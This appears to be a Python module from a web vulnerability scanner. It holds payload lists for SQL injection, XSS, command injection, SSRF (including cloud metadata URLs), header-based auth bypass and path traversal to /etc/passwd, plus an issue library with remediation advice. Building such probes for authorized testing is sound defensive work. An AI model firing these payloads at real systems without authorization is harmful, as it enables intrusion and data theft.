"""
Curated payload sets and the scan-issue library.

This is the data layer the active scanner and Intruder draw from:

  * PAYLOAD_SETS   — named lists of attack/fuzzing strings, grouped by class.
  * ISSUE_LIBRARY  — metadata for each issue type the scanner can raise
                     (description, remediation, references, default severity).

Everything here is inert data. It only becomes a request when the active engine
or Intruder substitutes it into an authorized target. The engine's authorization
gate still applies; shipping payloads does not bypass it.
"""

from __future__ import annotations

from dataclasses import dataclass, field


# A token the scanner echoes into responses so it can spot reflection reliably
# without false positives from pre-existing page content.
CANARY = "dd9x7k"


# --------------------------------------------------------------------------- #
# Payload sets
# --------------------------------------------------------------------------- #

# Boolean/error oriented SQLi probes. The scanner pairs these with a benign
# control value and diffs the responses.
SQLI_ERROR = [
    "'",
    "\"",
    "')",
    "';",
    "' OR '1'='1",
    "' OR '1'='2",
    "1' ORDER BY 1-- -",
    "1' ORDER BY 1000-- -",
    "' AND 1=CONVERT(int,@@version)-- -",
    "' UNION SELECT NULL-- -",
]

# Time-based blind SQLi, per engine family. {ms}/{s} are filled by the check.
SQLI_TIME = [
    "' AND SLEEP({s})-- -",
    "'; WAITFOR DELAY '0:0:{s}'-- -",
    "' AND pg_sleep({s})-- -",
    "\" AND SLEEP({s})-- -",
    "1) AND SLEEP({s})-- -",
    "' OR SLEEP({s})-- -",
]

# Reflected/stored XSS. The scanner wraps CANARY so reflection is unambiguous.
XSS = [
    "<{canary}>",
    "\"><svg/onload=1 {canary}>",
    "'\"><img src=x onerror={canary}>",
    "</title><{canary}>",
    "javascript:/*{canary}*/",
    "{{7*7}}{canary}",  # template-injection sniff rides along with XSS
]

# OS command injection. Time-based is the reliable signal across shells.
CMDI_TIME = [
    "; sleep {s}",
    "| sleep {s}",
    "|| sleep {s}",
    "& ping -n {sp1} 127.0.0.1",   # Windows: n packets ~ (n-1)s
    "`sleep {s}`",
    "$(sleep {s})",
    "%0asleep {s}",
]

# SSRF. The check prefers a user-supplied canary/collaborator URL; these are the
# classic internal targets used when only a timing/latency signal is available.
SSRF = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:22/",
    "http://localhost/",
    "http://[::1]/",
    "file:///etc/passwd",
    "dict://127.0.0.1:11211/",
]

# Auth-bypass request mutations expressed as header overrides the check applies.
AUTH_BYPASS_HEADERS = [
    ("X-Original-URL", "/"),
    ("X-Rewrite-URL", "/"),
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Forwarded-Host", "localhost"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Originating-IP", "127.0.0.1"),
    ("X-Remote-Addr", "127.0.0.1"),
]

# Path-traversal / LFI for Intruder fuzzing.
PATH_TRAVERSAL = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd%00",
]

# A compact generic fuzz list for Intruder sniper runs.
FUZZ_QUICK = [
    "", "'", "\"", "<", ">", "`", ";", "|", "&", "\\", "%00", "../",
    "{{7*7}}", "${7*7}", "() { :; }; echo vuln", "A" * 1024,
]


@dataclass
class PayloadSet:
    name: str
    category: str
    description: str
    payloads: list[str] = field(default_factory=list)


PAYLOAD_SETS: dict[str, PayloadSet] = {
    "sqli-error": PayloadSet("sqli-error", "sqli",
        "Error/boolean SQL injection probes", SQLI_ERROR),
    "sqli-time": PayloadSet("sqli-time", "sqli",
        "Time-based blind SQL injection probes", SQLI_TIME),
    "xss": PayloadSet("xss", "xss",
        "Reflected/stored XSS and template-injection probes", XSS),
    "cmdi-time": PayloadSet("cmdi-time", "cmdi",
        "Time-based OS command injection probes", CMDI_TIME),
    "ssrf": PayloadSet("ssrf", "ssrf",
        "Server-side request forgery targets", SSRF),
    "path-traversal": PayloadSet("path-traversal", "lfi",
        "Path traversal / local file inclusion", PATH_TRAVERSAL),
    "fuzz-quick": PayloadSet("fuzz-quick", "fuzz",
        "Compact general-purpose fuzz list", FUZZ_QUICK),
}


def payload_set(name: str) -> PayloadSet | None:
    return PAYLOAD_SETS.get(name)


def list_payload_sets() -> list[dict]:
    return [
        {"name": p.name, "category": p.category,
         "description": p.description, "count": len(p.payloads)}
        for p in PAYLOAD_SETS.values()
    ]


# --------------------------------------------------------------------------- #
# Scan-issue library
# --------------------------------------------------------------------------- #

@dataclass
class IssueType:
    key: str
    title: str
    severity: str
    description: str
    remediation: str
    references: list[str] = field(default_factory=list)


ISSUE_LIBRARY: dict[str, IssueType] = {
    "sqli": IssueType(
        "sqli", "SQL injection", "high",
        "User-controllable input is incorporated into a SQL query without "
        "sufficient parameterization, allowing an attacker to alter the query.",
        "Use parameterized queries / prepared statements. Never build SQL by "
        "string concatenation. Apply least-privilege database accounts.",
        ["https://owasp.org/www-community/attacks/SQL_Injection",
         "https://cwe.mitre.org/data/definitions/89.html"],
    ),
    "xss": IssueType(
        "xss", "Cross-site scripting (reflected)", "high",
        "Input is reflected into the response without contextual output "
        "encoding, allowing script execution in a victim's browser.",
        "Contextually encode all output. Adopt a strict Content-Security-Policy. "
        "Prefer framework auto-escaping and avoid innerHTML sinks.",
        ["https://owasp.org/www-community/attacks/xss/",
         "https://cwe.mitre.org/data/definitions/79.html"],
    ),
    "cmdi": IssueType(
        "cmdi", "OS command injection", "high",
        "User input reaches a system shell, letting an attacker run arbitrary "
        "operating-system commands.",
        "Avoid invoking shells. Use language-native APIs and pass arguments as "
        "arrays, never interpolated strings. Validate against strict allowlists.",
        ["https://owasp.org/www-community/attacks/Command_Injection",
         "https://cwe.mitre.org/data/definitions/78.html"],
    ),
    "ssrf": IssueType(
        "ssrf", "Server-side request forgery", "high",
        "The server can be coerced into making requests to attacker-chosen "
        "destinations, including internal services and cloud metadata endpoints.",
        "Validate and allowlist outbound destinations. Block link-local and "
        "private ranges. Require authentication on internal services.",
        ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
         "https://cwe.mitre.org/data/definitions/918.html"],
    ),
    "auth-bypass": IssueType(
        "auth-bypass", "Authentication / access-control bypass", "high",
        "A protected resource is reachable without proper credentials, or trusts "
        "client-supplied headers to make authorization decisions.",
        "Enforce access control server-side on every request. Never trust "
        "X-Forwarded-* or URL-override headers for authorization.",
        ["https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
         "https://cwe.mitre.org/data/definitions/287.html"],
    ),
    "lfi": IssueType(
        "lfi", "Path traversal / local file inclusion", "high",
        "User input is used to build a filesystem path, allowing access to files "
        "outside the intended directory.",
        "Resolve and canonicalize paths, then confirm they stay within an "
        "allowed base directory. Prefer opaque identifiers over file names.",
        ["https://owasp.org/www-community/attacks/Path_Traversal",
         "https://cwe.mitre.org/data/definitions/22.html"],
    ),
}


def issue(key: str) -> IssueType | None:
    return ISSUE_LIBRARY.get(key)


def list_issue_types() -> list[dict]:
    return [
        {"key": i.key, "title": i.title, "severity": i.severity,
         "description": i.description, "remediation": i.remediation,
         "references": i.references}
        for i in ISSUE_LIBRARY.values()
    ]
